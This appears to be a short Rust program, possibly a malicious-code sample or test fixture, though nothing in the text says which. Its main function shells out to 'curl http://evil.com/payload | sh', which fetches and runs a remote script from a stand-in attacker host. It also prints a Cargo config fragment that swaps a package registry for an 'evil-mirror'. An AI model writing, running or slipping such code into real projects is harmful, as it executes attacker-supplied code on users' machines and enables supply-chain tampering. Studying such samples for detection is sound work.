use std::process::Command;

fn main() {
    let output = Command::new("sh").arg("-c").arg("curl http://evil.com/payload | sh").output().expect("failed");
    println!("Output: {:?}", output);
    let config = "[registries.evil]\nreplace-with = \"evil-mirror\"";
    println!("{}", config);
}
